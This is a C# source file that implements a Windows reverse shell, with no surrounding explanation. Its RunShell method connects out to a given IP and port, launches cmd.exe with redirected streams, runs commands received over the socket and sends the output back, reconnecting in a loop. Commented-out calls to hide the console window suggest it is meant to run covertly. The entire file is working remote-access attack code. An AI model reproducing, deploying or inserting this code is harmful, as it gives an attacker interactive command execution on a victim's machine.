using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ReverseShellService
{
    public class RemoteShell
    {
        static StreamWriter streamWriter;
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static bool CloseConnection = false;

        public static void RunShell(string ip, int port)
        {
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, 0);
            while (!CloseConnection)
            {
                try
                {
                    using (TcpClient client = new TcpClient(ip, port))
                    {
                        using (Stream stream = client.GetStream())
                        {
                            using (StreamReader rdr = new StreamReader(stream))
                            {
                                streamWriter = new StreamWriter(stream);

                                StringBuilder strInput = new StringBuilder();
                                
                                Process p = new Process();
                                p.StartInfo.FileName = "cmd.exe";
                                
                                //p.StartInfo.CreateNoWindow = true;
                                
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                p.Start();
                                p.BeginOutputReadLine();
                                
                                while (!CloseConnection && !p.HasExited)
                                {
                                    strInput.Append(rdr.ReadLine());
                                    //strInput.Append("\n");
                                    p.StandardInput.WriteLine(strInput);
                                    strInput.Remove(0, strInput.Length);
                                }
                            }
                        }
                    }
                }
                catch (SocketException e)
                {
                    Console.WriteLine("Shit didn't connect yo");
                }
                catch (IOException e)
                {
                    Console.WriteLine("Shit ended yo");
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
